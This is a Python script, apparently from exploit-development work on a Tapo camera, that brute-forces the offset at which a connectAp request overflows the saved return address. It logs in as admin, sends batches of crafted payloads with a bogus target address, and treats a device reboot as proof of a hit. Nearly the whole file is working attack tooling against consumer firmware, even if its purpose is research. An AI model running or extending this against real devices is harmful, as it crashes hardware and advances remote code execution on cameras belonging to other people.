#!/usr/bin/env python3
"""Bare-offset positive-control probe.

Fire a payload whose target is an unmapped address at each offset in turn. Any hit reboots the
camera — unmistakable — which proves the write actually reaches the saved lr, fixes the offset and
leaves only the address unknown. Until a hit exists, nothing has been proven about the primitive.

The DS window is the scarce resource, so one login is spent on a *batch* of offsets, not one.

  usage: bare_offset_probe.py <ip> [start] [end] [step] [batch]
"""
import sys, time

sys.path.insert(0, "deliverables/scripts")
import tapo_connectap_sc as T

HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.4.243"
START = int(sys.argv[2]) if len(sys.argv) > 2 else 1024
END = int(sys.argv[3]) if len(sys.argv) > 3 else 8192
STEP = int(sys.argv[4]) if len(sys.argv) > 4 else 4
BATCH = int(sys.argv[5]) if len(sys.argv) > 5 else 8
BOGUS = 0xFFFFFFFF


def probe():
    return bool(T.post(HOST, "/", {"method": "login",
                                   "params": {"cnonce": "", "encrypt_type": "3",
                                              "username": "admin"}}, timeout=3).strip())


off = START
while off < END:
    if not probe():
        time.sleep(1)
        continue
    try:
        sess = T.login(HOST, tries=15)
    except SystemExit:
        continue
    fired = []
    for _ in range(BATCH):
        if off >= END:
            break
        b = T.build(off, None, BOGUS, sled=0, padpc=1, prefix=b"", bare=True, hang=False)
        try:
            T.req(HOST, sess, {"method": "connectAp",
                               "params": T.connect_params(b, "Aardvark", "00:00:00:00:00:00")},
                  timeout=6)
            fired.append(off)
        except SystemExit:
            break
        off += STEP
    print(f"{time.strftime('%H:%M:%S')} fired {fired[:1]}..{fired[-1:] or ''} n={len(fired)}", flush=True)
    # A reboot kills the session for far longer than a doze: a normal sleep costs one or two
    # probes (the unit answers again inside a couple of seconds), so demand a sustained outage.
    fails = 0
    for _ in range(8):
        if probe():
            break
        fails += 1
        time.sleep(2)
    if fails >= 6:
        print(f"REBOOT? after batch ending {off - STEP} (fired {fired[0]}..{fired[-1] if fired else '?'}, {fails} probes down)", flush=True)
        for _ in range(20):
            time.sleep(3)
            if probe():
                break
print("done", flush=True)
